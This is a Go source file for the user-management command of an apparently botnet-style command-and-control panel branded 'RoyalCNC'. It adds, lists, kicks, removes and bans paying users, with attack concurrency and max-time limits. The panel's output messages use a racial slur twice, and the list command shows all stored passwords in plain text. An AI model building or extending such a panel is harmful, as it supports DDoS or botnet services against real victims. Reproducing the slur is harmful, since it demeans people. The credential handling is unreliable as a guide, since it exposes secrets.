package commands

import (
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"
	"webserver/src/database"
	"webserver/src/server/sessions"

	"github.com/alexeyco/simpletable"
)

func users(session *sessions.Session, args []string) {
	conn := session.Conn
	if session.User.Rank != 2 {
		fmt.Fprintf(conn, "Insufficient Permissions neger !\r\n")
		return
	} else {
		if len(args) < 2 {
			fmt.Fprintf(conn, "\nInvalid Options Run: %s <help / ?>\r\n", args[0])
			return
		} else {

			switch args[1] {
			case "add":
				fmt.Fprint(conn, "Enter Username: ")
				username, err := session.Term.ReadLine("Enter Username: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Enter passwords: ")
				apikey, err := session.Term.ReadLine("Enter Key: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Enter max Concurrents: ")
				conns, err := session.Term.ReadLine("Enter Concurrents: ")
				if err != nil {
					return
				}
				concurrents, err := strconv.Atoi(conns)
				if err != nil {
					fmt.Fprintf(conn, "Invalid Interger please start again\r\n")
					return
				}
				fmt.Fprintf(conn, "Enter MaxTime: ")
				maxtime, err := session.Term.ReadLine("Enter MaxTime: ")
				if err != nil {
					return
				}
				mtime, err := strconv.Atoi(maxtime)
				if err != nil {
					fmt.Fprintf(conn, "Invalid Interger\r\n")
					return
				}
				fmt.Fprintf(conn, "Rank: ")
				rank, err := session.Term.ReadLine("Rank: ")
				if err != nil {
					return
				}
				var ret int
				switch rank {
				case "banned":
					ret = 0
					break
				case "user":
					ret = 1
					break
				case "admin":
					ret = 2
					break
				default:
					fmt.Fprintf(conn, "That Rank Does Not Exist!\r\n")
				}

				fmt.Fprintf(conn, "Enter Expire (days): ")
				dayz, err := session.Term.ReadLine("Enter Expire(days): ")
				if err != nil {
					return
				}
				days, err := strconv.Atoi(dayz)
				if err != nil {
					fmt.Fprintf(conn, "Invalid Interger\r\n")
					return
				}
				var oneday = 86400
				exp := (oneday * days) + int(time.Now().Unix())
				if err := database.AddNewUser(username, apikey, concurrents, mtime, ret, exp); err != nil {
					log.Printf("(add_user/err) %s", err)
					fmt.Fprintf(conn, "Something Went Wrong Adding User chek you're database acces.\r\n")
					return
				} else {
					fmt.Fprintf(conn, "User Added Successfully neger !\r\n")
				}
				break
			case "kick", "KICK":
				fmt.Fprintf(conn, "Enter Username: ")
				user, err := session.Term.ReadLine("Enter Username: ")
				if err != nil {
					return
				}

				if ok := KickUser(user); ok != true {
					fmt.Fprintf(conn, "Failed To Kick User\r\n")
					return
				} else {
					fmt.Fprintf(conn, "Kicked User Successfully...\r\n")
				}
				break
			case "list", "LIST":
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "RoyalCNC"},
						{Align: simpletable.AlignCenter, Text: "Username /"},
						{Align: simpletable.AlignCenter, Text: "Passwords /"},
						{Align: simpletable.AlignCenter, Text: "concurrent /"},
						{Align: simpletable.AlignCenter, Text: "maxtime /"},
						{Align: simpletable.AlignCenter, Text: "rank /"},
						{Align: simpletable.AlignCenter, Text: "Expire /"},
					},
				}
				users, err := database.FetchUsers()
				if err != nil {
					log.Printf("(err) %s", err)
					return
				}

				for i, user := range users {
					t := time.Unix(int64(user.Expire), 0)
					date := t.Format(time.UnixDate)

					var rank string

					switch user.Rank {
					case 0:
						rank = "banned"
						break
					case 1:
						rank = "user"
						break
					case 2:
						rank = "Admin"
						break
					}

					r := []*simpletable.Cell{
						{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
						{Text: fmt.Sprint(user.Username)},
						{Text: fmt.Sprint(user.ApiKey)},
						{Text: fmt.Sprint(user.Conns)},
						{Text: fmt.Sprint(user.MaxTime)},
						{Text: fmt.Sprint(rank)},
						{Text: fmt.Sprint(date)},
					}
					table.Body.Cells = append(table.Body.Cells, r)
				}
				table.SetStyle(simpletable.StyleCompactClassic)
				fmt.Fprintf(conn, strings.Replace("    "+table.String(), "\n", "\r\n    ", -1)+"\r\n")
				break
			case "remove":
				fmt.Fprintf(conn, "Enter Username: ")
				username, err := session.Term.ReadLine("Enter Username: ")
				if err != nil {
					return
				}
				err, ok := database.RemoveUser(username)
				if err != nil {
					fmt.Fprintf(conn, "Something Went Wrong...\r\n")
					log.Printf("(err) %s", err)
					return
				}
				if !ok {
					fmt.Fprintf(conn, "User Does Not Exists!\r\n")
					return
				} else {
					fmt.Fprintf(conn, "Successfully Removed User %s\r\n", username)
				}

				KickUser(username)
				break
			case "BAN", "ban":
				fmt.Fprintf(conn, "Enter Username: ")
				user, err := session.Term.ReadLine("Enter Username: ")
				if err != nil {
					return
				}
				if err := database.ChangeRank(user, 0); err != nil {
					return
				}
				if ok := KickUser(user); ok != true {
					fmt.Fprintf(conn, "Failed To Ban User\r\n")
					return
				} else {
					fmt.Fprintf(conn, "Banned User Successfully...\r\n")
				}
				break
			case "?", "HELP", "help":
				fmt.Fprintf(conn, "%s <list / add / remove / kick / ban>\r\n", args[0])
				break
			default:
				fmt.Fprintf(conn, "%s <list / add / remove>\r\n", args[0])
			}
		}
	}
}

func KickUser(username string) bool {
	for _, sesh := range sessions.Sessions {
		if sesh.User.Username == username {
			fmt.Fprintf(sesh.Conn, "\r\nYou Have Been Kicked...\r\n")
			sesh.Conn.Close()
			return true
		}
	}
	return false
}
